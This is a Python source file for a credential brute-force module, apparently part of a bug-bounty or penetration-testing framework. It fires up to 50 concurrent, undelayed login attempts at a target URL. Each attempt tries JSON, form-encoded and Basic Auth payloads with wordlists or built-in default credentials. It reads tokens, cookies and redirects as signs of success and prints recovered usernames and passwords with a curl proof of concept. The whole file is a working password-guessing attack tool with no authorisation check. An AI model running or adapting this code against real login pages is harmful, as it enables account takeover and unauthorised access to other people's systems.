import asyncio
import sys
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib import Path
import json
import urllib.request
import urllib.error
import urllib.parse
import base64


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities - CONCURRENT NO-DELAY VERSION"""

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts    = config.get('max_attempts', 1000)
        self.delay           = 0
        self.wordlist_path   = config.get('wordlist_path', 'wordlists')
        self.concurrency     = config.get('concurrency', 50)
        self.custom_userlist  = config.get('userlist', None)
        self.custom_passlist  = config.get('passlist', None)
        self._max_usernames   = config.get('max_usernames', 200)
        self._max_passwords   = config.get('max_passwords', 2000)

    def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
        if total == 0:
            return
        pct   = current / total
        filled = int(width * pct)
        bar   = '█' * filled + '░' * (width - filled)
        line  = f'\r\033[96m{prefix}:\033[0m [{bar}] \033[93m{pct*100:5.1f}%\033[0m  {current}/{total}'
        sys.stdout.write(line)
        sys.stdout.flush()
        if current >= total:
            sys.stdout.write('\n')
            sys.stdout.flush()

    async def run(self, target: str, **kwargs) -> List[Finding]:
        if not kwargs.get('enable_brute_force', False):
            return self.findings

        if kwargs.get('userlist'):      self.custom_userlist = kwargs['userlist']
        if kwargs.get('passlist'):      self.custom_passlist = kwargs['passlist']
        if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
        if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']

        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"

        print(f"\033[96m[*] Target URL: {target_url}\033[0m")
        print(f"\033[96m[*] Brute forcing regardless of form type...\033[0m")

        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
        print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
        print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")

        # Create endpoint dict with target URL - no form detection, just brute force
        endpoint = {
            'url': target_url,
            'form_type': 'auto',
            'fields': {
                'username_fields': ['email', 'username', 'user', 'login', 'name'],
                'password_field': 'password'
            }
        }

        await self._test_brute_force(endpoint)
        return self.findings

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        usernames: List[str] = []
        passwords: List[str] = []

        MAX_U = getattr(self, '_max_usernames', 200)
        MAX_P = getattr(self, '_max_passwords', 2000)

        def _load_capped(path, label, cap):
            lines = []
            with open(path, 'r', errors='ignore') as fh:
                for line in fh:
                    s = line.strip()
                    if s:
                        lines.append(s)
                    if len(lines) >= cap:
                        break
            flag = f' \033[91m(capped)\033[0m' if len(lines) == cap else ''
            print(f"\033[92m[+] {label}: {path} ({len(lines)} entries{flag})\033[0m")
            return lines

        import os
        cwd = Path(os.getcwd())

        def _resolve(raw_path: str) -> Optional[Path]:
            candidates = [
                Path(raw_path),
                cwd / raw_path,
                Path(raw_path).expanduser(),
            ]
            for c in candidates:
                try:
                    if c.exists():
                        return c.resolve()
                except Exception:
                    pass
            return None

        if self.custom_userlist:
            upath = _resolve(self.custom_userlist)
            if upath:
                usernames = _load_capped(upath, 'Custom userlist', MAX_U)
            else:
                print(f"\033[91m[!] Userlist not found: '{self.custom_userlist}'\033[0m")

        if not usernames:
            upath = _resolve(str(Path(self.wordlist_path) / 'usernames.txt'))
            if upath:
                usernames = _load_capped(upath, 'Userlist (default)', MAX_U)
            else:
                usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
                print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")

        if self.custom_passlist:
            ppath = _resolve(self.custom_passlist)
            if ppath:
                passwords = _load_capped(ppath, 'Custom passlist', MAX_P)
            else:
                print(f"\033[91m[!] Passlist not found: '{self.custom_passlist}'\033[0m")

        if not passwords:
            ppath = _resolve(str(Path(self.wordlist_path) / 'passwords.txt'))
            if ppath:
                passwords = _load_capped(ppath, 'Passlist (default)', MAX_P)
            else:
                passwords = ['admin', 'password', '123456', 'login', 'admin123']
                print(f"\033[93m[!] No passlist found — using {len(passwords)} built-in defaults\033[0m")

        print()
        return usernames, passwords

    async def _test_brute_force(self, endpoint: Dict):
        import itertools

        url = endpoint['url']
        base_usernames, passwords = self._load_wordlists()
        all_usernames = list(dict.fromkeys(base_usernames))
        total_attempts = len(all_usernames) * len(passwords)

        semaphore = asyncio.Semaphore(self.concurrency)
        found_event = asyncio.Event()
        rate_limited = [False]
        counter = [0]

        print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
        print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
        print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")

        async def attempt(username: str, password: str):
            if found_event.is_set():
                return
            async with semaphore:
                if found_event.is_set():
                    return
                try:
                    loop = asyncio.get_event_loop()

                    def do_request():
                        # Try multiple payload formats - return on first non-400 response
                        
                        # Format 1: JSON (email/password) - Firebase style
                        try:
                            body = json.dumps({
                                'email': username,
                                'password': password,
                                'returnSecureToken': True
                            }).encode('utf-8')
                            req = urllib.request.Request(
                                url,
                                data=body,
                                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
                                method='POST'
                            )
                            with urllib.request.urlopen(req, timeout=10) as r:
                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_email'
                        except urllib.error.HTTPError as e:
                            if e.code not in [400, 401, 403, 404]:
                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_email'
                        except Exception:
                            pass

                        # Format 2: JSON (username/password)
                        try:
                            body = json.dumps({
                                'username': username,
                                'password': password
                            }).encode('utf-8')
                            req = urllib.request.Request(
                                url,
                                data=body,
                                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
                                method='POST'
                            )
                            with urllib.request.urlopen(req, timeout=10) as r:
                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_user'
                        except urllib.error.HTTPError as e:
                            if e.code not in [400, 401, 403, 404]:
                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_user'
                        except Exception:
                            pass

                        # Format 3: Form URL encoded (email/password)
                        try:
                            data = urllib.parse.urlencode({
                                'email': username,
                                'password': password
                            }).encode('utf-8')
                            req = urllib.request.Request(
                                url,
                                data=data,
                                headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
                                method='POST'
                            )
                            with urllib.request.urlopen(req, timeout=10) as r:
                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_email'
                        except urllib.error.HTTPError as e:
                            if e.code not in [400, 401, 403, 404]:
                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_email'
                        except Exception:
                            pass

                        # Format 4: Form URL encoded (username/password)
                        try:
                            data = urllib.parse.urlencode({
                                'username': username,
                                'password': password
                            }).encode('utf-8')
                            req = urllib.request.Request(
                                url,
                                data=data,
                                headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
                                method='POST'
                            )
                            with urllib.request.urlopen(req, timeout=10) as r:
                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_user'
                        except urllib.error.HTTPError as e:
                            if e.code not in [400, 401, 403, 404]:
                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_user'
                        except Exception:
                            pass

                        # Format 5: Basic Auth
                        try:
                            auth_str = base64.b64encode(f"{username}:{password}".encode()).decode()
                            req = urllib.request.Request(
                                url,
                                headers={
                                    'Authorization': f'Basic {auth_str}',
                                    'User-Agent': 'Mozilla/5.0'
                                },
                                method='GET'
                            )
                            with urllib.request.urlopen(req, timeout=10) as r:
                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'basic_auth'
                        except urllib.error.HTTPError as e:
                            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'basic_auth'
                        except Exception as e:
                            return 0, str(e), {}, 'unknown'

                        return 0, 'All formats failed', {}, 'unknown'

                    status, text, resp_headers, used_format = await loop.run_in_executor(None, do_request)
                    tl = text.lower()

                    counter[0] += 1
                    self._print_progress(counter[0], total_attempts,
                                         prefix=f'  \033[96m{username[:22]:<22}\033[0m')

                    # Show first response for debugging
                    if counter[0] == 1:
                        sys.stdout.write('\n')
                        print(f"\033[90m[debug] HTTP {status} | Format: {used_format} | {text[:300]}\033[0m\n")

                    if status == 429:
                        rate_limited[0] = True
                        found_event.set()
                        return

                    # Success detection
                    is_success = False

                    # Check for auth tokens in response
                    if any(k in tl for k in ['idtoken', 'id_token', 'access_token', 'auth_token', 'token', 'sessionid', 'session_id', 'jwt', 'refresh_token']):
                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'incorrect', 'denied', 'unauthorized', 'null']):
                            is_success = True

                    # Check for successful HTTP status with positive indicators
                    if status in [200, 201, 202]:
                        error_indicators = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'try again', 'not found', 'false']
                        if not any(err in tl for err in error_indicators):
                            success_indicators = ['welcome', 'dashboard', 'success', 'logged in', 'authenticated', 'profile', 'home', 'admin', 'redirect', 'token', 'idtoken']
                            if any(succ in tl for succ in success_indicators):
                                is_success = True
                            cookies = str(resp_headers.get('Set-Cookie', '')).lower()
                            if any(c in cookies for c in ['session', 'token', 'auth', 'jwt', 'sid', 'uid']):
                                is_success = True

                    # Redirect to non-login page indicates success
                    if status in [301, 302, 303, 307, 308]:
                        location = resp_headers.get('Location', '').lower()
                        if location and not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
                            is_success = True

                    # 200 OK on Basic Auth is success
                    if used_format == 'basic_auth' and status == 200:
                        is_success = True

                    if is_success:
                        sys.stdout.write('\n')
                        self._report_success(username, password, url, counter[0],
                                             [used_format], 'password')
                        found_event.set()

                except asyncio.CancelledError:
                    raise
                except Exception:
                    counter[0] += 1

        tasks = [asyncio.create_task(attempt(u, p))
                 for u, p in itertools.product(all_usernames, passwords)]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            for t in tasks: t.cancel()
            sys.stdout.write('\n')
            print(f"\033[93m[!] Interrupted after {counter[0]} attempts\033[0m")
            return

        sys.stdout.write('\n')
        if rate_limited[0]:
            self._add_rate_limit_finding(url, counter[0])
        elif not found_event.is_set():
            print(f"\033[93m[-] No credentials found after {counter[0]} attempts\033[0m")

    def _report_success(self, username, password, url, attempts, username_fields, password_field):
        sep = "=" * 60
        print(f"\n\033[91m{sep}\033[0m")
        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
        print(f"\033[92m      Username : {username}\033[0m")
        print(f"\033[92m      Password : {password}\033[0m")
        print(f"\033[92m      URL      : {url}\033[0m")
        print(f"\033[92m      Attempts : {attempts}\033[0m")
        print(f"\033[91m{sep}\033[0m\n")
        self.add_finding(Finding(
            module='brute_force',
            title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
            severity='Critical',
            description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
            evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
            poc=f"curl -X POST '{url}' -d 'username={username}&password={password}'",
            remediation='Implement strong password policy, rate limiting, and account lockout',
            cvss_score=9.8, bounty_score=5000, target=url))

    def _add_rate_limit_finding(self, url, attempts):
        self.add_finding(Finding(
            module='brute_force', title='Rate Limiting Detected During Brute Force',
            severity='Info',
            description=f'Rate limiting triggered after {attempts} attempts',
            evidence={'attempts': attempts, 'url': url},
            poc=f"Send {attempts} login requests to {url}",
            remediation='Rate limiting is working correctly',
            cvss_score=0.0, bounty_score=0, target=url))
